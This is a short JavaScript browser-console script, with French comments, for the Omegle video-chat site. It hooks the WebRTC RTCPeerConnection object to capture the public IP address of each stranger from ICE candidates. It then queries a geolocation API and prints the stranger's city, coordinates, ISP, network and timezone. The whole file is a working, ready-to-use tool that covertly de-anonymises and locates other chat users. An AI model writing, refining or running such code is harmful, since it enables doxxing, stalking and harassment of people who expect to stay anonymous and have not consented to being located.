/**
* author - amannirala13 (modifié avec des améliorations)
* github - https://www.github.com/amannirala13
* 
* Ce script doit être exécuté dans la console des développeurs. Il récupère l'adresse IP
* des clients Omegle utilisant WebRTC, puis utilise l'API BigDataCloud
* pour obtenir des informations géographiques détaillées.
*/

window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
window.RTCPeerConnection = function (...args) {
    const pc = new window.oRTCPeerConnection(...args);
    pc.oaddIceCandidate = pc.addIceCandidate;
    pc.addIceCandidate = function (iceCandidate, ...rest) {
        const fields = iceCandidate.candidate.split(' ');
        if (fields[7] === 'srflx') {
            getLocation(fields[4]); // Récupère l'adresse IP détectée
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
};

async function getLocation(ip) {
    const requestOptions = {
        method: 'GET',
        redirect: 'follow'
    };

    /*
    OBTENEZ UNE CLÉ API GRATUITE ICI --> (https://www.bigdatacloud.com/)
    INSÉREZ LA CLÉ API DANS [YOUR_API_KEY_HERE]
    */
    fetch(`https://api.bigdatacloud.net/data/ip-geolocation-full?ip=${ip}&localityLanguage=en&key=[YOUR_API_KEY_HERE]`, requestOptions)
        .then(response => response.json())
        .then(result => {
            console.log("~~~~~~~~~~~~~~~~~~~~~~~");
            console.log("||||||||| GEO DATA |||||||||");
            console.log("~~~~~~~~~~~~~~~~~~~~~~~");
            console.log('IP Address:', ip);
            console.log("-----------------------");
            console.log("Country: ", result.country.name);
            console.log("Subdivision (Region): ", result.location.subdivision.name);
            console.log("City: ", result.location.locality);
            console.log("Latitude: ", result.location.latitude);
            console.log("Longitude: ", result.location.longitude);
            console.log("-----------------------");
            console.log("Network Name: ", result.network.organisation);
            console.log("Autonomous System (AS): ", result.network.asn);
            console.log("ISP: ", result.network.name);
            console.log("-----------------------");
            console.log("Connection Type: ", result.connectionType.type);
            console.log("Connection Confidence: ", result.connectionType.confidence);
            console.log("-----------------------");
            console.log("Timezone: ", result.location.timeZone.name);
            console.log("Offset (GMT): ", result.location.timeZone.gmtOffset);
            console.log("-----------------------");
            console.log("Confidence Level: ", result.confidence);
            console.log("-----------------------");
            console.log("Continent: ", result.continent.name);
            console.log("Location Accuracy Radius (in km): ", result.accuracy.radius);
        })
        .catch(error => console.log('Erreur lors de la récupération des données :', error));
}
